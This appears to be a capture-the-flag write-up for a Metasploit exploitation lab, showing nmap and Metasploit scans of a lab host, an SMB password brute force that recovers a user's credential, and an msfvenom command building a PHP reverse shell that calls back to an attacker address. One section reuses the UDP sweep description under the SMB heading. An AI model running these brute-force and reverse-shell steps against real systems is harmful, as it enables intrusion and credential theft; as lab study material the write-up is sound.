# 🕵️ Metasploit: Exploitation – Writeup

# Target Info
- IP: 10.10.179.2

# Task 2
## 🧩 Step 1: Scanning

Using `msfconsole`:

search portscan

We list potential port scanning modules available on the target system using the search portscan command
But we can use NMAP to better perform port scanning, like follow:

nmap -sS 10.10.179.2

PORT    STATE   SERVICE
21/tcp  open    ftp
22/tcp  open    ssh
139/tcp open    netbios-ssn
445/tcp open    microsoft-ds
8000/tcp open   http-alt
MAC Address: 02:95:48:A4:43:C3 (Unknown)

---

### UDP service identification 

The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

Using `scanner/discovery/udp_sweep`

set RHOSTS 10.10.179.2
run

Discovered NetBIOS on 10.10.179.2:137 (ACME IT SUPPORT)

---

### SMB scans 

The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

Using `scanner/smb/smb_version`

set RHOSTS 10.10.179.2
run

SMB Detected 10.10.179.2:445
Host is running version 6.1.0 (Unknown OS)

---

## Exploitation

### What is running on port 8000?
We know from previous scan that port 8000 is open to http-alt service
Using http_version msf module we can get its version

set RHOSTS 10.10.179.2
set RPORT 8000
run

And we get the result

10.10.179.2:8000 webfs/1.21

---

### What is 'penny' user's SMB password?
Search on msf smb_login

use scanner/smb/smb_login
set RHOSTS 10.10.179.2
set SMBUser penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
run

Success: '.\penny:leo1234'

# Task 6
Using MSFVenom set the payload (a php executable)

msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

Use MultiHandler exploit to receive incoming connection
